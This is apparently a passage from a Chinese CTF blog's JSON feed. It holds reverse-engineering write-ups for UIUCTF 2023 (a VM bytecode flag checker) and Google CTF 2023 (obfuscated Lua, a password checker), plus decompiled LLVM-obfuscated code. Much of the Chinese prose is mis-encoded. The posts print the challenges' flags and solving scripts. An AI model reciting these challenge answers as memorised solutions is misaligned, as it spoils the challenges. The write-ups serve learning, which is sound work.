data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+34h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">1860951317</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">2018413106</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        v7 <span class=\"token operator\">=</span> <span class=\"token number\">1565625762</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>byte_404030<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v8<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1375518149</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>byte_404033<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      v7 <span class=\"token operator\">=</span> <span class=\"token number\">1843433062</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">==</span> <span class=\"token number\">24246500</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">560024662</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        v4 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1375518149</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>y_4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        envp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> y_4 <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>envp <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          v4 <span class=\"token operator\">=</span> <span class=\"token number\">1843433062</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        v7 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1565625762</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token operator\">++</span>v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        v7 <span class=\"token operator\">=</span> <span class=\"token number\">1860951317</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1843433062</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>byte_404033<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        v5 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1375518149</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>y_4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        envp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> y_4 <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>envp <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>          v5 <span class=\"token operator\">=</span> <span class=\"token number\">24246500</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        v7 <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        v3 <span class=\"token operator\">=</span> <span class=\"token number\">560024662</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>          v3 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2018413106</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        v7 <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>æˆåŠŸæ··æ·†</p>\n<p><strong>å¦‚æœæ²¡æœ‰è¿›è¡Œ sudo make install , åˆ™éœ€è¦åœ¨ bin ç›®å½•ä¸‹ç¼–è¯‘æºç¨‹åºæˆ–è€…æŒ‡å®š clang è·¯å¾„</strong></p>\n<p>LLVM ç¼–è¯‘å™¨æ¡†æ¶ä¸‹ï¼Œä¸åŒçš„å‰ç«¯å¯ä»¥ç”Ÿæˆç»Ÿä¸€çš„ä¸­é—´è¡¨ç¤º (LLVM IR)</p>\n<p>LLVM ç¼–è¯‘å™¨å¯åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†</p>\n<p>å‰ç«¯å¯¹æºä»£ç è¿›è¡Œåˆ†æå¹¶å°†å…¶è½¬æ¢ä¸º IR (ä¸­é—´ä»£ç )</p>\n<p>(ä¼˜åŒ–å™¨) ä¸­ç«¯å¯¹ç”Ÿæˆçš„ IR è¿›è¡Œåˆ†æå’Œä¼˜åŒ–</p>\n<p>åç«¯å°† IR è½¬æ¢ä¸ºåŸç”Ÿæœºå™¨ä»£ç </p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/03/UIUCTF2023/",
            "url": "https://3cly.github.io/2023/07/03/UIUCTF2023/",
            "title": "UIUCTF2023",
            "date_published": "2023-07-03T07:51:49.000Z",
            "content_html": "<h1 id=\"uiuctf\"><a class=\"markdownIt-Anchor\" href=\"#uiuctf\">#</a> UIUCTF</h1>\n<p>åšäº†ä¸€é“é¢˜å°±æ‘†çƒ‚äº† (ç¬¬äºŒå¤©è€ƒè¯•) Win95 çš„ä¸»é¢˜æŒºæœ‰ç‰¹è‰²</p>\n<h2 id=\"vmwhere1\"><a class=\"markdownIt-Anchor\" href=\"#vmwhere1\">#</a> VMWHERE1</h2>\n<p><img data-src=\"/images/image-20230701112737549.png\" alt=\"image-20230701112737549\"></p>\n<p>ç»™äº†ä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ª chal æ˜¯è™šæ‹Ÿæœºç¨‹åº  ä¸€ä¸ª program æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ å°±æ˜¯éœ€è¦ç”¨è™šæ‹Ÿæœºè½½å…¥çš„ç¨‹åº</p>\n<h3 id=\"chal\"><a class=\"markdownIt-Anchor\" href=\"#chal\">#</a> chal</h3>\n<p><img data-src=\"/images/image-20230703143835828.png\" alt=\"image-20230703143835828\"></p>\n<p>IDA7.7 æ‰“å¼€è™šæ‹Ÿæœºç¨‹åºï¼Œé€»è¾‘å¾ˆæ¸…æ™° while å¾ªç¯å’Œ switch-case å…¶ä¸­æ¯ä¸€ä¸ª case å¯¹åº”ä¸€ä¸ªæ“ä½œ</p>\n<p>å¯ä»¥ç”¨ x86 æ±‡ç¼–æŒ‡ä»¤è¿‘ä¼¼ç†è§£</p>\n<ul>\n<li>case 0: è¿”å›æŒ‡ä»¤ï¼ˆretï¼‰</li>\n<li>case 1: åŠ æ³•æŒ‡ä»¤ï¼ˆaddï¼‰</li>\n<li>case 2: å‡æ³•æŒ‡ä»¤ï¼ˆsubï¼‰</li>\n<li>case 3: ä½ä¸æŒ‡ä»¤ï¼ˆandï¼‰</li>\n<li>case 4: ä½æˆ–æŒ‡ä»¤ï¼ˆorï¼‰</li>\n<li>case 5: ä½å¼‚æˆ–æŒ‡ä»¤ï¼ˆxorï¼‰</li>\n<li>case 6: å·¦ç§»æŒ‡ä»¤ï¼ˆshlï¼‰</li>\n<li>case 7: å³ç§»æŒ‡ä»¤ï¼ˆshrï¼‰</li>\n<li>case 8: è·å–è¾“å…¥æŒ‡ä»¤ï¼ˆgetcharï¼‰</li>\n<li>case 9: è¾“å‡ºæŒ‡ä»¤ï¼ˆputcharï¼‰</li>\n<li>case 0xA: èµ‹å€¼æŒ‡ä»¤ï¼ˆpushï¼‰</li>\n<li>case 0xB: æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼ˆjzï¼‰</li>\n<li>case 0xC: æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼ˆjnzï¼‰</li>\n<li>case 0xD: æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼ˆjmpï¼‰</li>\n<li>case 0xE: å‡ä¸€æŒ‡ä»¤ï¼ˆdecï¼‰</li>\n<li>case 0xF: å¤åˆ¶</li>\n<li>case 0x28: è°ƒç”¨å­å‡½æ•°æŒ‡ä»¤</li>\n</ul>\n<p>è¿™é‡Œæ³¨æ„ä¸€ç‚¹æ˜¯é€šè¿‡ getchar () å‡½æ•°è¯»å–è¾“å…¥ï¼Œè€Œ C è¯­è¨€çš„ getchar () å‡½æ•°ä¸€æ¬¡åªè¯»å–ä¸€ä¸ªï¼Œå¤šä½™çš„éƒ½ä¼šå¿½ç•¥ï¼Œå¯ä»¥çŒœæµ‹å¯¹ flag çš„éªŒè¯æ˜¯ä¸€ä½ä¸€ä½çš„éªŒè¯</p>\n<h3 id=\"program\"><a class=\"markdownIt-Anchor\" href=\"#program\">#</a> program</h3>\n<p>010Editor æ‰“å¼€</p>\n<p><img data-src=\"/images/image-20230703144613400.png\" alt=\"image-20230703144613400\"></p>\n<p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¼€å¤´å’Œç»“å°¾åˆ™æ˜¯ç¨‹åºè¿è¡Œå’Œç»“æŸæ—¶ä¼šæç¤ºçš„å­—ç¬¦ä¸² ä¸­é—´å°±æ˜¯éœ€è¦åˆ†æçš„ code</p>\n<h3 id=\"åŠ¨æ€è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#åŠ¨æ€è°ƒè¯•\">#</a> åŠ¨æ€è°ƒè¯•</h3>\n<p>æ€è·¯æ˜¯åœ¨è¾“å…¥æ—¶å€™ä¸‹æ–­ç‚¹ åªåˆ†æåé¢çš„ code å°±è¡Œäº†</p>\n<p><img data-src=\"/images/image-20230703145015778.png\" alt=\"image-20230703145015778\"></p>\n<p>åœ¨ getchar () è¿™é‡Œä¸‹æ–­ç‚¹  (æ¯ä¸ªæŒ‡ä»¤åé¢çš„ goto LABEL_31 ä¸ç”¨ç®¡ï¼Œå°±æ˜¯éªŒè¯æŒ‡ä»¤æ˜¯å¦åˆæ³•ä»¥åŠæ ˆæ˜¯å¦æº¢å‡º)</p>\n<p>ç„¶åä¸€ç›´ F8 æ‰¾åˆ°éªŒè¯ flag çš„é€»è¾‘  å‘ç°æ¯å½“è¿è¡Œåœ¨è¿™é‡Œ ä¹Ÿå°±æ˜¯ç¨‹åº code ä¸º<strong> 08 0F 0A 04 07 05 05 0F 0A XX 05 0C 00 03 0D</strong> æ˜¯ä¸€ä¸ªå›ºå®šçš„ä¸€ä¸²æŒ‡ä»¤åœ¨ program ä¸­æ˜¯è´Ÿè´£å¯¹ flag çš„æ¯ä¸€ä½è¿›è¡Œæ£€æŸ¥ (v10 çš„å‰ä¸€ä½æ˜¯å¦ä¸º 0) é€šè¿‡å³è·³è½¬ è‹¥é”™è¯¯åˆ™ä¼šè¿›å…¥ 0xD çš„è·³è½¬ ç„¶åå°±è·³è½¬åˆ° program æœ«å°¾ è¾“å‡ºé”™è¯¯å­—ç¬¦ä¸²</p>\n<p><img data-src=\"/images/image-20230701152849383.png\" alt=\"image-20230701152849383\"></p>\n<p>äºæ˜¯æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®©ä»–é€šè¿‡éªŒè¯å°±è¡Œäº† è€Œæ¯ä¸€ä½çš„éªŒè¯é€»è¾‘éƒ½ä¸€æ · åˆ†æç¬¬ä¸€ä½å°±è¡Œäº†</p>\n<p>è¿™é‡Œæˆ‘å†™äº†å‰ä¸‰ä½çš„ç¤ºä¾‹</p>\n<p>(password[0]&gt;&gt;4) ^ password[0] ^ 0x72 ^ 0x00==0  password[0]=â€™uâ€™</p>\n<p>(password[1]&gt;&gt;4) ^ password[1] ^ 0x72 ^ 0x1d==0  password[1]= â€˜iâ€™</p>\n<p>(password[2]&gt;&gt;4) ^ password[2] ^ 0x1d ^ 0x6f==0   password[2]=â€™uâ€™</p>\n<p>â€¦</p>\n<p><strong>(password[i]&gt;&gt;4) ^ password[i] ^ 0xXX ^ 0xXX==0</strong></p>\n<p>08 0F 0A 04 07 05 05 0F 0A XX 05 0C 00 03 0D çš„éªŒè¯é€»è¾‘å°±æ˜¯è¿™æ ·ï¼Œå…¶ä¸­é™¤äº†ç¬¬ä¸€ä½çš„ç¬¬ä¸€ä¸ª 0xXX çš„å€¼ä¸º 0x00 åé¢çš„ 0xXX çš„å€¼éƒ½æ˜¯ push è¿›å»çš„å€¼å’Œå‰ä¸€æ¬¡éªŒè¯æ—¶ push çš„å€¼</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230701164247.png\" alt=\"QQå›¾ç‰‡20230701164247\"></p>\n<p>ç›´æ¥åœ¨ program ä¸­æ‰¾å‡º 0xXX å†è‡ªå·±å¼‚æˆ–å°±è¡Œè¾£</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> password_0 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>password_0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> password_0 <span class=\"token operator\">^</span> <span class=\"token number\">0x72</span><span class=\"token operator\">^</span><span class=\"token number\">0x1d</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password[0] =\"</span><span class=\"token punctuation\">,</span> password_0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ç±»ä¼¼è¿™æ ·è§£å‡ºæ‰€æœ‰ä½å°±è¡Œäº†</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>uiuctf<span class=\"token punctuation\">&#123;</span>ar3_y0u_4_r3al_vm_wh3r3_<span class=\"token punctuation\">(</span>gpt _g3n3r4t3d _th1s _f14g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230703140220.png\" alt=\"QQå›¾ç‰‡20230703140220\"></p>\n<h2 id=\"vmwhere2\"><a class=\"markdownIt-Anchor\" href=\"#vmwhere2\">#</a> VMWHERE2</h2>\n<p>è¾“å…¥ç¬¬ä¸€ä½å˜äºŒè¿›åˆ¶ å† push ff</p>\n<p><img data-src=\"/images/image-20230702115936644.png\" alt=\"image-20230702115936644\"></p>\n<p>å‰ä¸€ä½ 0xff</p>\n<p><img data-src=\"/images/image-20230702121556088.png\" alt=\"image-20230702121556088\"></p>\n<p>æ²¡åšäº† è¹² WP</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/03/Google-CTF-2023/",
            "url": "https://3cly.github.io/2023/07/03/Google-CTF-2023/",
            "title": "Google CTF 2023",
            "date_published": "2023-07-03T07:51:13.000Z",
            "content_html": "<h1 id=\"google-ctf-2023\"><a class=\"markdownIt-Anchor\" href=\"#google-ctf-2023\">#</a> Google CTF 2023</h1>\n<h2 id=\"zermatt\"><a class=\"markdownIt-Anchor\" href=\"#zermatt\">#</a> ZerMatt</h2>\n<p>ç»™çš„æ˜¯æ··æ·†åçš„ lua çš„æºç  vscode ä¸­ æŒ‰ shift+alt+f å¯æ ¼å¼åŒ–</p>\n<p>ä¸‹è½½ lua5.3 è¿è¡Œä¸€ä¸‹</p>\n<p><img data-src=\"/images/image-20230624101916067.png\" alt=\"image-20230624101916067\"></p>\n<p><img data-src=\"/images/image-20230624110539119.png\" alt=\"image-20230624110539119\"></p>\n<p>luaide æ²¡è°ƒèµ·</p>\n<p>å¤±è´¥å’ŒæˆåŠŸå­—ç¬¦ä¸²éƒ½è¦ç»è¿‡ v7 å‡½æ•°ä¹‹åå†æ‰“å°å‡ºæ¥ v7 å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–</p>\n<p><img data-src=\"/images/image-20230624135556506.png\" alt=\"image-20230624135556506\"></p>\n<p><img data-src=\"/images/image-20230624150849918.png\" alt=\"image-20230624150849918\"></p>\n<p><img data-src=\"/images/image-20230624151216266.png\" alt=\"image-20230624151216266\"> å¯ç–‘çš„ v21 æ‰“å°å°±æ˜¯ flag</p>\n<p><img data-src=\"/images/image-20230624150633183.png\" alt=\"image-20230624150633183\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CTF<span class=\"token punctuation\">&#123;</span>At_least_it_was_not_a_bytecode_base_sandbox_escape<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"old-school\"><a class=\"markdownIt-Anchor\" href=\"#old-school\">#</a> Old School</h2>\n<p><img data-src=\"/images/image-20230624210921273.png\" alt=\"image-20230624210921273\"></p>\n<p><img data-src=\"/images/image-20230624201207803.png\" alt=\"image-20230624201207803\"></p>\n<p>è¿™ä¸ªå‡½æ•°æ˜¯éªŒè¯å¯†ç çš„ç»„æˆ:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  m <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> input<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> k <span class=\"token operator\">==</span> <span class=\"token number\">5</span> <span class=\"token operator\">||</span> k <span class=\"token operator\">==</span> <span class=\"token number\">11</span> <span class=\"token operator\">||</span> k <span class=\"token operator\">==</span> <span class=\"token number\">17</span> <span class=\"token operator\">||</span> k <span class=\"token operator\">==</span> <span class=\"token number\">23</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> input<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">45</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      v39 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">sub_565C60DA</span><span class=\"token punctuation\">(</span>v20<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_565DF8D6</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// v3=v21[j]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          v17 <span class=\"token operator\">=</span> <span class=\"token function\">sub_565DF8FA</span><span class=\"token 